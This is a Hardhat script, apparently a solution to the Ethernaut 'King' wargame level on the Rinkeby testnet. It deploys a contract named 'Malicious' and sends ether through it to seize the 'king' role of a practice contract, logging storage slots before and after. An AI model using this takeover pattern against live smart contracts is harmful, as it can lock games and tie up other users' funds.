/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const INSTANCE = "0x9b65B1f421F1F8B2561347C8BB11dB4de304B305"
const {deployed} = require('./deployed');
const { ethers } = require('hardhat');


async function instanceState(constract, rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log("Storage '0' address of the king: ", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("Storage '1' prize: ", ethers.utils.formatEther(ethers.BigNumber.from(await rinkeby.getStorageAt(INSTANCE, 1)).toString()), 'ETH')
  console.log("Storage '2' address of owner: ", await rinkeby.getStorageAt(INSTANCE, 2))
  console.log("Owner: ", await constract.owner())
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  console.log(`deploying constracts with ${deployer.address}`)


  let King = await hre.ethers.getContractFactory('King')
  let king = await King.attach(INSTANCE)

  const Malicious = await hre.ethers.getContractFactory('Malicious')
  const malicious = await Malicious.deploy(INSTANCE)
  await malicious.deployed()

  deployed('Malicious', hre.network.name, malicious.address);

  console.log('King functions:')
  console.log(king.functions, '\n')

  console.log('Malicious functions:')
  console.log(malicious.functions, '\n')

  await instanceState(king, rinkeby)


  //step 1 Become the king
  console.log("SETP 1")
  console.log("Become the king with our malicious contract...")
  const gas = await malicious.estimateGas.beKing({value: ethers.utils.parseEther('0.001')})
  console.log("Estimate gas necessary", ethers.utils.formatEther(ethers.BigNumber.from(gas).toString()), 'ETH')
  const tx = await malicious.beKing({gasLimit: gas * 2, value: ethers.utils.parseEther('0.01')})
  const receipt = await tx.wait()
  console.log(receipt)
  console.log("transaction confirmed !")

  await instanceState(king, rinkeby)
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
